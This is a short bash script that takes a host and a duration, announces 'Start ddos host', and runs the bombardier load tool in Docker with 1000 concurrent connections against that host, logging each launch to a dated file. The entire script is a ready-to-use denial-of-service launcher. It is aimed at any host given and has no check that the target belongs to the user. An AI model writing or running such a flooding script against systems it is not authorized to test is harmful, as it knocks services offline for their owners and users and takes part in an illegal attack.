#!/bin/bash

if [ "$1" == "" ]; then
      echo "No host available"
      exit 0;
fi

d=`date '+%Y-%m-%d %H:%M:%S'`
d2=`date '+%Y-%m-%d'`

echo "Start ddos host $1"

docker run -d --rm alpine/bombardier -c 1000 -d $2s -l "$1"

echo "$d docker run -d --rm alpine/bombardier -c 1000 -d $2s -l $1" >> "$d2".log